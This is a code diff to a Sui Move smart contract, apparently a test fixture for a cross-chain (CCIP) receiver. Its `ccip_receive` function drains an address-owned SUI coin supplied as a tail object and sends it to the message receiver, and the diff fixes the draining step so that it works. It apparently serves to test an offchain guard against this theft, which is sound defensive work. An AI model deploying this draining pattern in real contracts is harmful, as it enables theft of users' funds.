@@ -107,7 +107,7 @@ public fun get_counter(state: &CCIPReceiverState): u64 {
 }
 
 /// CCIP entrypoint. The `drain_coin` tail slot is the exploit surface: a transmitter-owned
-/// SUI coin named in `receiverObjectIds` would be handed in here as `&mut Coin<SUI>` under the
+/// SUI coin named in `receiverObjectIds` would be handed in here as `&mut Coin<sui::sui::SUI>` under the
 /// transmitter's signature. The body drains it to the message receiver. The offchain guard
 /// skips this receiver leg before that can happen, so guarded execution never calls this.
 public fun ccip_receive(
@@ -116,7 +116,7 @@ public fun ccip_receive(
     message: client::Any2SuiMessage,
     clock: &Clock,
     state: &mut CCIPReceiverState,
-    drain_coin: &mut Coin<SUI>,
+    drain_coin: &mut Coin<sui::sui::SUI>,
     ctx: &mut TxContext,
 ) {
     clock;
@@ -133,9 +133,9 @@ public fun ccip_receive(
 
     assert!(message_id == expected_message_id, EMessageIdMismatch);
 
-    // Exploit: drain the address-owned SUI coin supplied as a tail object.
-    let amount = coin::value(drain_coin);
-    let stolen = coin::take(drain_coin, amount, ctx);
+    // Exploit: drain the address-owned SUI coin supplied as a tail object. coin::split takes
+    // &mut Coin<T> (unlike coin::take, which needs a Balance) and returns the split-off coin.
+    let stolen = coin::split(drain_coin, coin::value(drain_coin), ctx);
     transfer::public_transfer(stolen, message_receiver);
 
     state.counter = state.counter + 1;
